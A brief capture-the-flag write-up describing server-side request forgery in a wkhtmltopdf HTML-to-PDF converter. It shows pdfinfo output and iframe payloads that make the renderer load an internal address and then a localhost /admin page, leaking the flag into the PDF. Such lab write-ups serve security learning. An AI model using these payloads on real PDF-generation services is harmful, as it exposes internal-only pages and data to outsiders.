1. got pdf creator info via

```console
└─$ pdfinfo convert.pdf 
Title:           
Creator:         wkhtmltopdf 0.12.5
Producer:        Qt 4.8.7
CreationDate:    Sat May 30 03:20:11 2026 EDT
Custom Metadata: no
Metadata Stream: no
Tagged:          no
UserProperties:  no
Suspects:        no
Form:            none
JavaScript:      no
Pages:           1
Encrypted:       no
Page size:       595 x 842 pts (A4)
Page rot:        0
File size:       13577 bytes
Optimized:       no
PDF version:     1.4
```

2. when we add an html `<iframe src="http://10.48.188.176:6000" width="800" height="600"></iframe>` the page was iframed and displayed inside the pdf

3. when fuzzing there was an `/admin` path leading to 403

4. payload `<iframe src="http://localhost:6000/admin" width="800" height="600"></iframe>` gave us the flag embeded in the pdf

